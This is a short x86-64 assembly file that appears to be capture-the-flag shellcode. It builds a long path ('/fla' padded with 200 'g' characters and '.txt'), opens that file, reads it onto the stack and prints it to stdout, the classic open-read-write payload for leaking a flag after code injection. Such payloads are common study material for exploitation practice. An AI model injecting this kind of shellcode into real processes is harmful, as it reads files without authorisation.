
    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    lea rdi, [rel flagpath]
    add rdi, 4
    mov rsi, 200
    jmp append_g

orw:
    lea rdi, [rel flagpath]
    add rdi, 4+200
    mov dword [rdi], '.txt'

    xor rdi, rdi
    lea rsi, [rel flagpath]
    xor rdx, rdx
    xor r10, r10
    mov rax, 257
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rdi, 1
    mov rax, 1
    syscall

append_g:
    mov byte [rdi], 'g'
    inc rdi
    dec rsi
    test rsi, rsi
    jnz append_g
    jmp orw

flagpath: db "/fla", 0
